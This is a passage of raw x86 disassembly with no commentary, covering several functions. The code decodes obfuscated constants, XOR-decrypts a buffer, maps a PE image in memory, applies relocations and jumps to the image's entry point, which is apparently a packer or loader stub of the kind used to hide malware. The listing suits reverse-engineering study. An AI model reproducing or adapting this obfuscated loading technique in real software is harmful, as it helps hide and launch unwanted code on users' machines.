  4265a3:	mov    DWORD PTR [ebp-0x3c],eax
  4265a6:	mov    edi,0xf89c85ba
  4265ab:	mov    DWORD PTR [ebp-0x2c],edi
  4265ae:	mov    eax,DWORD PTR [ebp-0x28]
  4265b1:	xor    eax,ebx
  4265b3:	add    eax,esi
  4265b5:	mov    DWORD PTR [ebp-0xc],eax
  4265b8:	mov    eax,DWORD PTR [ebp-0x28]
  4265bb:	xor    eax,ebx
  4265bd:	add    eax,esi
  4265bf:	mov    DWORD PTR [ebp-0x14],eax
  4265c2:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  4265c9:	mov    DWORD PTR [ebp-0x20],0xf89c85bc
  4265d0:	mov    eax,DWORD PTR [ebp-0x28]
  4265d3:	mov    ecx,DWORD PTR [ebp-0x38]
  4265d6:	xor    eax,ebx
  4265d8:	add    eax,esi
  4265da:	cmp    ecx,eax
  4265dc:	je     0x4267d2
  4265e2:	jmp    0x4267ae
  4265e7:	mov    ecx,DWORD PTR [ebp-0xc]
  4265ea:	mov    eax,DWORD PTR [ebp-0x38]
  4265ed:	sub    eax,ecx
  4265ef:	mov    ecx,DWORD PTR [ebp-0x48]
  4265f2:	xor    ecx,ebx
  4265f4:	add    ecx,esi
  4265f6:	xor    edx,edx
  4265f8:	div    ecx
  4265fa:	mov    DWORD PTR [ebp-0x14],eax
  4265fd:	mov    eax,DWORD PTR [ebp-0x20]
  426600:	mov    ecx,DWORD PTR [ebp-0x14]
  426603:	xor    eax,ebx
  426605:	add    eax,esi
  426607:	cmp    ecx,eax
  426609:	jbe    0x426615
  42660b:	mov    eax,DWORD PTR [ebp-0x20]
  42660e:	xor    eax,ebx
  426610:	add    eax,esi
  426612:	mov    DWORD PTR [ebp-0x14],eax
  426615:	mov    eax,DWORD PTR [ebp-0x48]
  426618:	mov    ecx,DWORD PTR [ebp-0x14]
  42661b:	xor    eax,ebx
  42661d:	add    eax,esi
  42661f:	imul   eax,ecx
  426622:	mov    DWORD PTR [ebp-0x14],eax
  426625:	mov    eax,DWORD PTR [ebp-0x28]
  426628:	mov    ecx,DWORD PTR [ebp-0x14]
  42662b:	xor    eax,ebx
  42662d:	add    eax,esi
  42662f:	cmp    ecx,eax
  426631:	je     0x42679c
  426637:	mov    eax,DWORD PTR [ebp-0x14]
  42663a:	mov    DWORD PTR [ebp-0x34],eax
  42663d:	mov    eax,DWORD PTR [ebp-0xc]
  426640:	add    eax,DWORD PTR [ebp-0x3c]
  426643:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  42664a:	mov    DWORD PTR [ebp-0x14],edi
  42664d:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  426654:	mov    DWORD PTR [ebp-0x1c],eax
  426657:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  42665e:	mov    DWORD PTR [ebp-0x8],edi
  426661:	mov    eax,DWORD PTR [ebp-0x4c]
  426664:	xor    eax,ebx
  426666:	add    eax,esi
  426668:	jmp    0x42675b
  42666d:	mov    DWORD PTR [ebp-0xe4],0xf89c85b0
  426677:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  426681:	mov    eax,DWORD PTR [ebp-0x8]
  426684:	mov    ecx,DWORD PTR [ebp-0x18]
  426687:	xor    eax,ebx
  426689:	add    eax,esi
  42668b:	imul   eax,ecx
  42668e:	mov    ecx,DWORD PTR [ebp-0x1c]
  426691:	mov    al,BYTE PTR [eax+ecx*1]
  426694:	mov    BYTE PTR [ebp-0x1],al
  426697:	mov    eax,DWORD PTR [ebp-0x8]
  42669a:	mov    ecx,DWORD PTR [ebp-0x18]
  42669d:	xor    eax,ebx
  42669f:	add    eax,esi
  4266a1:	imul   eax,ecx
  4266a4:	mov    ecx,DWORD PTR [ebp-0x54]
  4266a7:	xor    ecx,ebx
  4266a9:	add    eax,ecx
  4266ab:	mov    ecx,DWORD PTR [ebp-0x1c]
  4266ae:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  4266b6:	mov    ecx,DWORD PTR [ebp-0xe4]
  4266bc:	xor    ecx,ebx
  4266be:	lea    eax,[ecx+eax*1+0x3272f1]
  4266c5:	movzx  ecx,BYTE PTR [ebp-0x1]
  4266c9:	xor    ecx,eax
  4266cb:	mov    BYTE PTR [ebp-0x1],cl
  4266ce:	mov    al,BYTE PTR [ebp-0x1]
  4266d1:	mov    ecx,DWORD PTR [ebp-0x8]
  4266d4:	mov    edx,DWORD PTR [ebp-0x18]
  4266d7:	xor    ecx,ebx
  4266d9:	add    ecx,esi
  4266db:	imul   ecx,edx
  4266de:	mov    edx,DWORD PTR [ebp-0x1c]
  4266e1:	mov    BYTE PTR [ecx+edx*1],al
  4266e4:	mov    eax,DWORD PTR [ebp-0x8]
  4266e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4266ea:	xor    eax,ebx
  4266ec:	add    eax,esi
  4266ee:	imul   eax,ecx
  4266f1:	mov    ecx,DWORD PTR [ebp-0x1c]
  4266f4:	mov    al,BYTE PTR [eax+ecx*1]
  4266f7:	mov    BYTE PTR [ebp-0x1],al
  4266fa:	mov    eax,DWORD PTR [ebp-0x8]
  4266fd:	mov    ecx,DWORD PTR [ebp-0x18]
  426700:	xor    eax,ebx
  426702:	add    eax,esi
  426704:	imul   eax,ecx
  426707:	mov    ecx,DWORD PTR [ebp-0x14]
  42670a:	xor    ecx,ebx
  42670c:	add    eax,ecx
  42670e:	mov    ecx,DWORD PTR [ebp-0x1c]
  426711:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  426719:	mov    ecx,DWORD PTR [ebp-0xd0]
  42671f:	xor    ecx,ebx
  426721:	lea    eax,[ecx+eax*1+0x3272f1]
  426728:	movzx  ecx,BYTE PTR [ebp-0x1]
  42672c:	xor    ecx,eax
  42672e:	mov    BYTE PTR [ebp-0x1],cl
  426731:	mov    al,BYTE PTR [ebp-0x1]
  426734:	mov    ecx,DWORD PTR [ebp-0x8]
  426737:	mov    edx,DWORD PTR [ebp-0x18]
  42673a:	xor    ecx,ebx
  42673c:	add    ecx,esi
  42673e:	imul   ecx,edx
  426741:	mov    edx,DWORD PTR [ebp-0x1c]
  426744:	mov    BYTE PTR [ecx+edx*1],al
  426747:	mov    eax,DWORD PTR [ebp-0x30]
  42674a:	mov    ecx,DWORD PTR [ebp-0x14]
  42674d:	xor    eax,ebx
  42674f:	xor    ecx,ebx
  426751:	add    eax,esi
  426753:	add    ecx,esi
  426755:	imul   eax,ecx
  426758:	add    eax,DWORD PTR [ebp-0x18]
  42675b:	mov    DWORD PTR [ebp-0x18],eax
  42675e:	mov    eax,DWORD PTR [ebp-0x18]
  426761:	mov    ecx,DWORD PTR [ebp-0x34]
  426764:	cmp    ecx,eax
  426766:	jb     0x42666d
  42676c:	mov    eax,DWORD PTR [ebp-0x14]
  42676f:	mov    ecx,DWORD PTR [ebp-0x34]
  426772:	xor    eax,ebx
  426774:	add    eax,esi
  426776:	imul   eax,ecx
  426779:	mov    ecx,DWORD PTR [ebp-0x4c]
  42677c:	xor    ecx,ebx
  42677e:	add    ecx,esi
  426780:	or     eax,ecx
  426782:	mov    ecx,DWORD PTR [ebp-0x2c]
  426785:	xor    ecx,ebx
  426787:	add    eax,ecx
  426789:	mov    ecx,DWORD PTR [ebp-0x2c]
  42678c:	xor    ecx,ebx
  42678e:	add    eax,ecx
  426790:	mov    ecx,DWORD PTR [ebp-0xc]
  426793:	lea    eax,[eax+ecx*1+0x64e5e2]
  42679a:	jmp    0x4267ab
  42679c:	mov    eax,DWORD PTR [ebp-0x2c]
  42679f:	mov    ecx,DWORD PTR [ebp-0xc]
  4267a2:	xor    eax,ebx
  4267a4:	lea    eax,[eax+ecx*1+0x3272f1]
  4267ab:	mov    DWORD PTR [ebp-0xc],eax
  4267ae:	mov    eax,DWORD PTR [ebp-0x2c]
  4267b1:	xor    eax,ebx
  4267b3:	mov    ecx,0xffcd8d0f
  4267b8:	sub    ecx,eax
  4267ba:	add    ecx,DWORD PTR [ebp-0x38]
  4267bd:	mov    eax,DWORD PTR [ebp-0x2c]
  4267c0:	mov    edx,DWORD PTR [ebp-0xc]
  4267c3:	xor    eax,ebx
  4267c5:	add    eax,esi
  4267c7:	imul   eax,edx
  4267ca:	cmp    eax,ecx
  4267cc:	jbe    0x4265e7
  4267d2:	push   DWORD PTR [ebp+0x8]
  4267d5:	mov    eax,DWORD PTR [ebp+0x8]
  4267d8:	push   DWORD PTR [eax+0x1cc]
  4267de:	lea    eax,[ebp-0xd8]
  4267e4:	push   eax
  4267e5:	mov    eax,DWORD PTR [ebp+0x8]
  4267e8:	mov    eax,DWORD PTR [eax+0x1c4]
  4267ee:	push   DWORD PTR [eax]
  4267f0:	mov    eax,DWORD PTR [ebp+0x8]
  4267f3:	mov    eax,DWORD PTR [eax+0x1c0]
  4267f9:	push   DWORD PTR [eax]
  4267fb:	push   DWORD PTR [ebp-0x40]
  4267fe:	push   DWORD PTR [ebp-0x24]
  426801:	call   0x427298
  426806:	mov    DWORD PTR [ebp-0x3c],eax
  426809:	mov    eax,DWORD PTR [ebp-0x10]
  42680c:	mov    ecx,DWORD PTR [ebp-0x24]
  42680f:	xor    eax,ebx
  426811:	add    eax,esi
  426813:	cmp    eax,ecx
  426815:	je     0x426836
  426817:	mov    eax,DWORD PTR [ebp+0x8]
  42681a:	mov    ecx,DWORD PTR [ebp-0x50]
  42681d:	mov    eax,DWORD PTR [eax+0x1e0]
  426823:	xor    ecx,ebx
  426825:	add    ecx,esi
  426827:	push   ecx
  426828:	mov    ecx,DWORD PTR [ebp-0x10]
  42682b:	xor    ecx,ebx
  42682d:	add    ecx,esi
  42682f:	push   ecx
  426830:	push   DWORD PTR [ebp-0x24]
  426833:	call   DWORD PTR [eax+0x18]
  426836:	pop    edi
  426837:	pop    esi
  426838:	pop    ebx
  426839:	leave  
  42683a:	ret    0x4
  42683d:	push   ebp
  42683e:	mov    ebp,esp
  426840:	push   ecx
  426841:	push   ecx
  426842:	lea    eax,[ebp-0x8]
  426845:	mov    DWORD PTR [ebp-0x4],eax
  426848:	push   esi
  426849:	mov    esi,DWORD PTR [ebp-0x4]
  42684c:	mov    eax,0xf881ba2f
  426851:	mov    DWORD PTR [esi],eax
  426853:	mov    esi,DWORD PTR [ebp-0x8]
  426856:	cmp    esi,eax
  426858:	pop    esi
  426859:	jne    0x426863
  42685b:	mov    BYTE PTR [ecx+0xa],0x83
  42685f:	mov    BYTE PTR [edx+0x8],0x2e
  426863:	mov    BYTE PTR [edx+0xa],0x83
  426867:	mov    BYTE PTR [ecx+0x2],0x11
  42686b:	leave  
  42686c:	ret    
  42686d:	push   ebp
  42686e:	mov    ebp,esp
  426870:	push   ecx
  426871:	push   ecx
  426872:	lea    eax,[ebp-0x8]
  426875:	mov    DWORD PTR [ebp-0x4],eax
  426878:	mov    edx,DWORD PTR [ebp-0x4]
  42687b:	mov    eax,0xf88b0bc3
  426880:	mov    DWORD PTR [edx],eax
  426882:	mov    edx,DWORD PTR [ebp-0x8]
  426885:	cmp    edx,eax
  426887:	jne    0x426898
  426889:	mov    eax,DWORD PTR [ebp+0x8]
  42688c:	mov    BYTE PTR [ecx+0x9],0xf
  426890:	mov    BYTE PTR [eax+0x7],0x56
  426894:	mov    BYTE PTR [ecx+0x6],0xe
  426898:	mov    BYTE PTR [ecx+0x3],0x1f
  42689c:	leave  
  42689d:	ret    0x4
  4268a0:	push   ebp
  4268a1:	mov    ebp,esp
  4268a3:	push   ecx
  4268a4:	push   ecx
  4268a5:	lea    eax,[ebp-0x8]
  4268a8:	mov    DWORD PTR [ebp-0x4],eax
  4268ab:	mov    edx,DWORD PTR [ebp-0x4]
  4268ae:	mov    eax,0x7e0da2f
  4268b3:	mov    DWORD PTR [edx],eax
  4268b5:	mov    edx,DWORD PTR [ebp-0x8]
  4268b8:	cmp    edx,eax
  4268ba:	jne    0x4268c0
  4268bc:	mov    BYTE PTR [ecx+0x7],0x56
  4268c0:	mov    eax,DWORD PTR [ebp+0x8]
  4268c3:	mov    BYTE PTR [ecx+0x1],0x14
  4268c7:	mov    BYTE PTR [eax+0x9],0x2f
  4268cb:	leave  
  4268cc:	ret    0x4
  4268cf:	push   ebp
  4268d0:	mov    ebp,esp
  4268d2:	push   ecx
  4268d3:	push   ecx
  4268d4:	lea    eax,[ebp-0x8]
  4268d7:	mov    DWORD PTR [ebp-0x4],eax
  4268da:	push   esi
  4268db:	mov    esi,DWORD PTR [ebp-0x4]
  4268de:	mov    eax,0x7060e3c
  4268e3:	mov    DWORD PTR [esi],eax
  4268e5:	mov    esi,DWORD PTR [ebp-0x8]
  4268e8:	cmp    esi,eax
  4268ea:	pop    esi
  4268eb:	jne    0x4268f7
  4268ed:	mov    BYTE PTR [edx+0x4],0x12
  4268f1:	mov    WORD PTR [ecx+0x3],0x121f
  4268f7:	mov    BYTE PTR [edx],0x3e
  4268fa:	leave  
  4268fb:	ret    
  4268fc:	push   ebp
  4268fd:	mov    ebp,esp
  4268ff:	push   ecx
  426900:	push   ecx
  426901:	lea    eax,[ebp-0x8]
  426904:	mov    DWORD PTR [ebp-0x4],eax
  426907:	mov    edx,DWORD PTR [ebp-0x4]
  42690a:	mov    eax,0xf8870b3f
  42690f:	mov    DWORD PTR [edx],eax
  426911:	mov    edx,DWORD PTR [ebp-0x8]
  426914:	cmp    edx,eax
  426916:	jne    0x426923
  426918:	mov    eax,DWORD PTR [ebp+0x8]
  42691b:	mov    BYTE PTR [ecx+0x8],0xe
  42691f:	mov    BYTE PTR [eax+0x1],0x14
  426923:	mov    BYTE PTR [ecx+0x5],0xa
  426927:	leave  
  426928:	ret    0x4
  42692b:	push   esi
  42692c:	mov    ecx,edi
  42692e:	call   0x4268fc
  426933:	mov    edx,edi
  426935:	mov    ecx,esi
  426937:	mov    BYTE PTR [esi],0x1e
  42693a:	call   0x4268cf
  42693f:	push   esi
  426940:	mov    ecx,edi
  426942:	mov    BYTE PTR [esi+0x5],0xa
  426946:	call   0x4268a0
  42694b:	push   esi
  42694c:	mov    BYTE PTR [esi+0x6],0xe
  426950:	call   0x42686d
  426955:	mov    BYTE PTR [esi+0x2],0x11
  426959:	mov    edx,esi
  42695b:	jmp    0x42683d
  426960:	push   ebp
  426961:	mov    ebp,esp
  426963:	push   ecx
  426964:	mov    ecx,DWORD PTR [edx+0x194]
  42696a:	push   esi
  42696b:	mov    esi,DWORD PTR [ebp+0x8]
  42696e:	mov    esi,DWORD PTR [esi]
  426970:	mov    DWORD PTR [ecx],esi
  426972:	mov    ecx,DWORD PTR [edx+0x194]
  426978:	mov    ecx,DWORD PTR [ecx]
  42697a:	mov    esi,DWORD PTR [edx+0x190]
  426980:	mov    DWORD PTR [esi],ecx
  426982:	mov    eax,DWORD PTR [edx+0x194]
  426988:	mov    ecx,DWORD PTR [eax]
  42698a:	mov    ecx,DWORD PTR [ecx+0x3c]
  42698d:	add    ecx,DWORD PTR [eax]
  42698f:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  426996:	mov    eax,DWORD PTR [ebp-0x4]
  426999:	movzx  ecx,WORD PTR [ecx+0x16]
  42699d:	xor    eax,0x75108aa
  4269a2:	add    eax,0x3272f1
  4269a7:	pop    esi
  4269a8:	test   ecx,eax
  4269aa:	je     0x4269b8
  4269ac:	mov    eax,DWORD PTR [edx+0x1c8]
  4269b2:	mov    DWORD PTR [eax],0xf89c85ba
  4269b8:	leave  
  4269b9:	ret    0x4
  4269bc:	push   ebp
  4269bd:	mov    ebp,esp
  4269bf:	sub    esp,0x70
  4269c2:	and    DWORD PTR [ebp-0x20],0x0
  4269c6:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  4269cd:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  4269d4:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  4269db:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4269e2:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  4269e9:	mov    eax,DWORD PTR [ebp+0x20]
  4269ec:	mov    eax,DWORD PTR [eax+0x194]
  4269f2:	mov    DWORD PTR [ebp-0xc],eax
  4269f5:	mov    eax,DWORD PTR [ebp+0x20]
  4269f8:	push   ebx
  4269f9:	push   esi
  4269fa:	mov    esi,DWORD PTR [eax+0x190]
  426a00:	mov    eax,DWORD PTR [ebp+0x20]
  426a03:	mov    eax,DWORD PTR [eax+0x18c]
  426a09:	mov    DWORD PTR [ebp-0x8],eax
  426a0c:	mov    eax,DWORD PTR [eax]
  426a0e:	push   edi
  426a0f:	mov    DWORD PTR [ebp-0x4],esi
  426a12:	test   eax,eax
  426a14:	jne    0x426a21
  426a16:	push   DWORD PTR [ebp+0x1c]
  426a19:	mov    edx,DWORD PTR [ebp+0x20]
  426a1c:	call   0x426960
  426a21:	mov    eax,DWORD PTR [esi]
  426a23:	mov    ebx,DWORD PTR [esi]
  426a25:	add    ebx,DWORD PTR [eax+0x3c]
  426a28:	mov    eax,DWORD PTR [ebp+0xc]
  426a2b:	mov    ecx,DWORD PTR [ebp-0x8]
  426a2e:	mov    ecx,DWORD PTR [ecx]
  426a30:	mov    esi,0x75108aa
  426a35:	xor    eax,esi
  426a37:	mov    edi,0x3272f1
  426a3c:	add    eax,edi
  426a3e:	cmp    eax,ecx
  426a40:	jne    0x426c78
  426a46:	mov    eax,DWORD PTR [ebp-0xc]
  426a49:	mov    eax,DWORD PTR [eax]
  426a4b:	mov    DWORD PTR [ebp-0x10],eax
  426a4e:	mov    eax,DWORD PTR [ebx+0x50]
  426a51:	mov    DWORD PTR [ebp-0x68],eax
  426a54:	mov    eax,DWORD PTR [ebp-0x18]
  426a57:	xor    eax,esi
  426a59:	add    eax,edi
  426a5b:	mov    DWORD PTR [ebp-0x64],eax
  426a5e:	mov    eax,DWORD PTR [ebp-0x14]
  426a61:	and    DWORD PTR [ebp-0x6c],0x0
  426a65:	xor    eax,esi
  426a67:	add    eax,edi
  426a69:	mov    DWORD PTR [ebp-0x60],eax
  426a6c:	lea    eax,[ebp-0x70]
  426a6f:	push   eax
  426a70:	mov    eax,DWORD PTR [ebp+0x8]
  426a73:	xor    eax,esi
  426a75:	add    eax,edi
  426a77:	push   eax
  426a78:	mov    eax,DWORD PTR [ebp+0x20]
  426a7b:	add    eax,0xaa
  426a80:	push   eax
  426a81:	mov    eax,DWORD PTR [ebp+0x20]
  426a84:	mov    eax,DWORD PTR [eax+0x198]
  426a8a:	mov    DWORD PTR [ebp-0x70],0x4
  426a91:	push   DWORD PTR [eax]
  426a93:	mov    eax,DWORD PTR [ebp+0x10]
  426a96:	call   eax
  426a98:	mov    ecx,DWORD PTR [ebp-0xc]
  426a9b:	mov    ecx,DWORD PTR [ecx]
  426a9d:	mov    edx,DWORD PTR [ebp-0x8]
  426aa0:	mov    DWORD PTR [ebp-0x6c],eax
  426aa3:	mov    DWORD PTR [ebp+0x1c],eax
  426aa6:	mov    DWORD PTR [edx],ecx
  426aa8:	mov    ecx,DWORD PTR [ebp-0x4]
  426aab:	mov    DWORD PTR [ecx],eax
  426aad:	mov    eax,DWORD PTR [ebx+0x50]
  426ab0:	mov    DWORD PTR [ebp-0x68],eax
  426ab3:	mov    eax,DWORD PTR [ebp-0x1c]
  426ab6:	xor    eax,esi
  426ab8:	add    eax,edi
  426aba:	mov    DWORD PTR [ebp-0x64],eax
  426abd:	lea    eax,[ebp-0x20]
  426ac0:	mov    DWORD PTR [ebp-0x60],eax
  426ac3:	lea    eax,[ebp-0x70]
  426ac6:	push   eax
  426ac7:	mov    eax,DWORD PTR [ebp+0x8]
  426aca:	xor    eax,esi
  426acc:	add    eax,edi
  426ace:	push   eax
  426acf:	mov    eax,DWORD PTR [ebp+0x20]
  426ad2:	add    eax,0xee
  426ad7:	push   eax
  426ad8:	mov    eax,DWORD PTR [ebp+0x20]
  426adb:	mov    eax,DWORD PTR [eax+0x198]
  426ae1:	mov    DWORD PTR [ebp-0x70],0x4
  426ae8:	push   DWORD PTR [eax]
  426aea:	mov    eax,DWORD PTR [ebp+0x10]
  426aed:	call   eax
  426aef:	test   eax,eax
  426af1:	je     0x426b16
  426af3:	and    DWORD PTR [ebp+0xc],0x0
  426af7:	cmp    DWORD PTR [ebx+0x50],0x0
  426afb:	jbe    0x426b16
  426afd:	mov    eax,DWORD PTR [ebp+0x1c]
  426b00:	mov    ecx,DWORD PTR [ebp-0x10]
  426b03:	sub    ecx,eax
  426b05:	mov    dl,BYTE PTR [ecx+eax*1]
  426b08:	inc    DWORD PTR [ebp+0xc]
  426b0b:	mov    BYTE PTR [eax],dl
  426b0d:	mov    edx,DWORD PTR [ebp+0xc]
  426b10:	inc    eax
  426b11:	cmp    edx,DWORD PTR [ebx+0x50]
  426b14:	jb     0x426b05
  426b16:	mov    edx,DWORD PTR [ebp+0x1c]
  426b19:	mov    ecx,DWORD PTR [edx+0x3c]
  426b1c:	add    ecx,edx
  426b1e:	mov    eax,DWORD PTR [ecx+0xa0]
  426b24:	mov    ebx,DWORD PTR [ecx+0x28]
  426b27:	add    eax,edx
  426b29:	sub    edx,DWORD PTR [ebp-0x10]
  426b2c:	add    ebx,DWORD PTR [ebp+0x1c]
  426b2f:	mov    DWORD PTR [ebp+0xc],edx
  426b32:	mov    DWORD PTR [ebp-0x2c],ecx
  426b35:	mov    DWORD PTR [ebp-0x14],ebx
  426b38:	mov    DWORD PTR [ebp-0x8],0x0
  426b3f:	jmp    0x426bbb
  426b41:	add    edx,0xfffffff8
  426b44:	shr    edx,1
  426b46:	mov    DWORD PTR [ebp-0x18],edx
  426b49:	je     0x426ba7
  426b4b:	lea    edx,[eax+0x8]
  426b4e:	mov    DWORD PTR [ebp-0x4],edx
  426b51:	mov    edx,DWORD PTR [ebp-0x18]
  426b54:	mov    DWORD PTR [ebp-0x18],edx
  426b57:	mov    edx,DWORD PTR [ebp-0x4]
  426b5a:	movzx  edx,WORD PTR [edx]
  426b5d:	mov    DWORD PTR [ebp-0x24],edx
  426b60:	and    edx,0xfff
  426b66:	mov    DWORD PTR [ebp-0x28],edx
  426b69:	mov    edx,DWORD PTR [ebp-0x24]
  426b6c:	shr    edx,0xc
  426b6f:	add    edx,0xffcd8d0f
  426b75:	xor    edx,esi
  426b77:	cmp    edx,0xf89c85b8
  426b7d:	jne    0x426b9e
  426b7f:	mov    edx,DWORD PTR [ebp-0x28]
  426b82:	add    edx,DWORD PTR [ebp+0x1c]
  426b85:	mov    ebx,DWORD PTR [eax]
  426b87:	cmp    DWORD PTR [ebx+edx*1],0x0
  426b8b:	je     0x426b9b
  426b8d:	mov    ecx,DWORD PTR [ebp+0xc]
  426b90:	add    ecx,DWORD PTR [ebx+edx*1]
  426b93:	mov    ebx,DWORD PTR [eax]
  426b95:	mov    DWORD PTR [edx+ebx*1],ecx
  426b98:	mov    ecx,DWORD PTR [ebp-0x2c]
  426b9b:	mov    ebx,DWORD PTR [ebp-0x14]
  426b9e:	add    DWORD PTR [ebp-0x4],0x2
  426ba2:	dec    DWORD PTR [ebp-0x18]
  426ba5:	jne    0x426b57
  426ba7:	mov    edx,DWORD PTR [ebp-0xc]
  426baa:	add    DWORD PTR [ebp-0x8],edx
  426bad:	mov    edx,DWORD PTR [ebp-0x8]
  426bb0:	cmp    edx,DWORD PTR [ecx+0xa4]
  426bb6:	jae    0x426bc9
  426bb8:	add    eax,DWORD PTR [ebp-0xc]
  426bbb:	mov    edx,DWORD PTR [eax+0x4]
  426bbe:	mov    DWORD PTR [ebp-0xc],edx
  426bc1:	test   edx,edx
  426bc3:	jne    0x426b41
  426bc9:	mov    eax,DWORD PTR [ebp-0x10]
  426bcc:	mov    DWORD PTR [ebp-0x6c],eax
  426bcf:	mov    DWORD PTR [ebp-0x70],0x4
  426bd6:	mov    eax,DWORD PTR [ecx+0x50]
  426bd9:	mov    DWORD PTR [ebp-0x68],eax
  426bdc:	mov    eax,DWORD PTR [ebp-0x1c]
  426bdf:	xor    eax,esi
  426be1:	add    eax,edi
  426be3:	mov    DWORD PTR [ebp-0x64],eax
  426be6:	lea    eax,[ebp-0x20]
  426be9:	mov    DWORD PTR [ebp-0x60],eax
  426bec:	lea    eax,[ebp-0x70]
  426bef:	push   eax
  426bf0:	mov    eax,DWORD PTR [ebp+0x8]
  426bf3:	xor    eax,esi
  426bf5:	add    eax,edi
  426bf7:	push   eax
  426bf8:	mov    eax,DWORD PTR [ebp+0x20]
  426bfb:	add    eax,0xee
  426c00:	push   eax
  426c01:	mov    eax,DWORD PTR [ebp+0x20]
  426c04:	mov    eax,DWORD PTR [eax+0x198]
  426c0a:	push   DWORD PTR [eax]
  426c0c:	mov    eax,DWORD PTR [ebp+0x10]
  426c0f:	call   eax
  426c11:	mov    eax,DWORD PTR [ebp+0x20]
  426c14:	mov    eax,DWORD PTR [eax+0x180]
  426c1a:	add    eax,DWORD PTR [ebp+0xc]
  426c1d:	mov    ecx,DWORD PTR [ebp+0xc]
  426c20:	push   DWORD PTR [ebp+0x18]
  426c23:	mov    DWORD PTR [eax],ecx
  426c25:	push   DWORD PTR [ebp+0x14]
  426c28:	push   DWORD PTR [ebp+0x1c]
  426c2b:	call   ebx
  426c2d:	mov    ecx,DWORD PTR [ebp+0xc]
  426c30:	add    ecx,DWORD PTR [ebp+0x20]
  426c33:	lea    eax,[ebp+0x4]
  426c36:	mov    DWORD PTR [ebp+0x20],ecx
  426c39:	mov    ecx,DWORD PTR [ebp+0x20]
  426c3c:	mov    ecx,DWORD PTR [ebp+0x20]
  426c3f:	mov    edx,DWORD PTR [ecx+0x190]
  426c45:	mov    ecx,DWORD PTR [ebp+0x20]
  426c48:	mov    ecx,DWORD PTR [ecx+0x18c]
  426c4e:	mov    esi,DWORD PTR [ecx]
  426c50:	cmp    DWORD PTR [eax],esi
  426c52:	jb     0x426c73
  426c54:	mov    esi,DWORD PTR [edx]
  426c56:	mov    edi,DWORD PTR [edx]
  426c58:	mov    esi,DWORD PTR [esi+0x3c]
  426c5b:	lea    esi,[edi+esi*1+0x50]
  426c5f:	mov    edi,DWORD PTR [ecx]
  426c61:	add    edi,DWORD PTR [esi]
  426c63:	cmp    DWORD PTR [eax],edi
  426c65:	jae    0x426c73
  426c67:	mov    esi,DWORD PTR [ecx]
  426c69:	mov    ecx,DWORD PTR [eax]
  426c6b:	mov    edx,DWORD PTR [edx]
  426c6d:	sub    ecx,esi
  426c6f:	add    edx,ecx
  426c71:	mov    DWORD PTR [eax],edx
  426c73:	mov    eax,DWORD PTR [ebp+0xc]
  426c76:	jmp    0x426c7a
  426c78:	xor    eax,eax
  426c7a:	pop    edi
  426c7b:	pop    esi
  426c7c:	pop    ebx
  426c7d:	leave  
  426c7e:	ret    0x1c
  426c81:	push   ebp
  426c82:	mov    ebp,esp
  426c84:	sub    esp,0x1c
  426c87:	push   esi
  426c88:	mov    esi,eax
  426c8a:	mov    eax,DWORD PTR [ecx+0x190]
  426c90:	cmp    DWORD PTR [eax],0x0
  426c93:	je     0x426da3
  426c99:	test   edx,edx
  426c9b:	je     0x426da3
  426ca1:	test   esi,esi
  426ca3:	je     0x426da3
  426ca9:	mov    eax,DWORD PTR [esi+0x88]
  426caf:	test   eax,eax
  426cb1:	je     0x426d9e
  426cb7:	cmp    DWORD PTR [esi+0x8c],0x10
  426cbe:	je     0x426d9e
  426cc4:	cmp    DWORD PTR [esi+0x34],edx
  426cc7:	je     0x426d9e
  426ccd:	mov    esi,DWORD PTR [ecx+0x18c]
  426cd3:	and    DWORD PTR [ebp-0x10],0x0
  426cd7:	mov    ecx,edx
  426cd9:	sub    ecx,DWORD PTR [esi]
  426cdb:	add    eax,edx
  426cdd:	movzx  edx,WORD PTR [eax+0xc]
  426ce1:	mov    DWORD PTR [ebp-0x1c],ecx
  426ce4:	movzx  ecx,WORD PTR [eax+0xe]
  426ce8:	add    ecx,edx
  426cea:	je     0x426d9e
  426cf0:	lea    ecx,[eax+0x14]
  426cf3:	push   ebx
  426cf4:	mov    DWORD PTR [ebp-0x18],ecx
  426cf7:	mov    esi,0x7fffffff
  426cfc:	push   edi
  426cfd:	test   DWORD PTR [ecx],esi
  426cff:	je     0x426d80
  426d01:	mov    edx,DWORD PTR [ecx]
  426d03:	and    DWORD PTR [ebp-0xc],0x0
  426d07:	and    edx,esi
  426d09:	add    edx,eax
  426d0b:	movzx  edi,WORD PTR [edx+0xe]
  426d0f:	movzx  ebx,WORD PTR [edx+0xc]
  426d13:	add    edi,ebx
  426d15:	je     0x426d80
  426d17:	lea    ecx,[edx+0x14]
  426d1a:	mov    DWORD PTR [ebp-0x14],ecx
  426d1d:	test   DWORD PTR [ecx],esi
  426d1f:	je     0x426d62
  426d21:	mov    ecx,DWORD PTR [ecx]
  426d23:	and    DWORD PTR [ebp-0x8],0x0
  426d27:	and    ecx,esi
  426d29:	add    ecx,eax
  426d2b:	movzx  edi,WORD PTR [ecx+0xe]
  426d2f:	movzx  ebx,WORD PTR [ecx+0xc]
  426d33:	add    edi,ebx
  426d35:	je     0x426d62
  426d37:	lea    edi,[ecx+0x14]
  426d3a:	mov    DWORD PTR [ebp-0x4],edi
  426d3d:	mov    edi,DWORD PTR [ebp-0x4]
  426d40:	mov    edi,DWORD PTR [edi]
  426d42:	test   edi,edi
  426d44:	je     0x426d4c
  426d46:	mov    ebx,DWORD PTR [ebp-0x1c]
  426d49:	add    DWORD PTR [edi+eax*1],ebx
  426d4c:	movzx  edi,WORD PTR [ecx+0xe]
  426d50:	movzx  ebx,WORD PTR [ecx+0xc]
  426d54:	inc    DWORD PTR [ebp-0x8]
  426d57:	add    DWORD PTR [ebp-0x4],0x8
  426d5b:	add    edi,ebx
  426d5d:	cmp    DWORD PTR [ebp-0x8],edi
  426d60:	jb     0x426d3d
